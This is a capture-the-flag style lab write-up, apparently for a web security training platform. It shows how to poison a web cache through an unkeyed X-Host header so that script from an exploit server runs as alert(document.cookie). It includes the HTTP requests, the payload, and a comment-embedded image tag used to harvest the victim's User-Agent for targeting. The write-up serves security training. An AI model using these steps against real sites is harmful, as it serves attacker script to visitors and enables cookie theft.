## Targeted web cache poisoning using an unknown header

This lab is vulnerable to web cache poisoning. A victim user will view any comments that you post. To solve this lab, you need to poison the cache with a response that executes alert(document.cookie) in the visitor's browser. However, you also need to make sure that the response is served to the specific subset of users to which the intended victim belongs.

## Notes

- Exploit server
- /login
- X-Cache Header
- Cache-Control Header
- /resources/js/tracking.js

## Notes

## Resume

1. Find cached request
2. Find a unknow header using **Param miner**
2. Exploit the XSS with custom header
3. Store payload on exploit server
4. Deliver exploit to victim

## Solve

The first step is to find a cached request, in this lab the home page has a cached HTTPS response : 

```http
GET / HTTP/2
Host: 0aee00cf03ffc72780ff94380083000b.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 11
X-Cache: hit
Content-Length: 11119
```

We now need to find a header that we could possibly exploit. For this we're using [Param miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943). In this case, send the home page request to reapeater then :

`Right click over ther request -> Extension -> Param miner -> Guess header`

After a few seconds we can see that the `X-Host` header is supported :

We can now go to the exploit server store our payload with the file name : `/resources/js/tracking.js` : 

```js
alert(document.cookie)
```

Once it's stored, we can send multiple home page request including our `X-Host` header who point on our exploit.

```http
GET / HTTP/2
Host: 0aee00cf03ffc72780ff94380083000b.web-security-academy.net
X-Host: exploit-0abe00000356c779809c93f201d60006.exploit-server.net
```

In order to solve the lab we have one last step. We need to deliver the poc to the **'specific subset of users'**. To do this, inside the comment section we can comment any **PostId** with the following payload : 

```html
<img src="https://exploit-0abe00000356c779809c93f201d60006.exploit-server.net/" />
```

After a moment we get a request : 

```http
GET / HTTP/1.1" 200 
user-agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

We can now update our initial payload using the victim's user agent: 

```http
GET / HTTP/2
Host: 0aee00cf03ffc72780ff94380083000b.web-security-academy.net
X-Host: exploit-0abe00000356c779809c93f201d60006.exploit-server.net
User-Agent: Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36
```

Keep sending the request until you see your exploit server URL reflected in the response and X-Cache: hit in the headers.

Replay the request to keep the cache poisoned until the victim visits the site and the lab is solved.
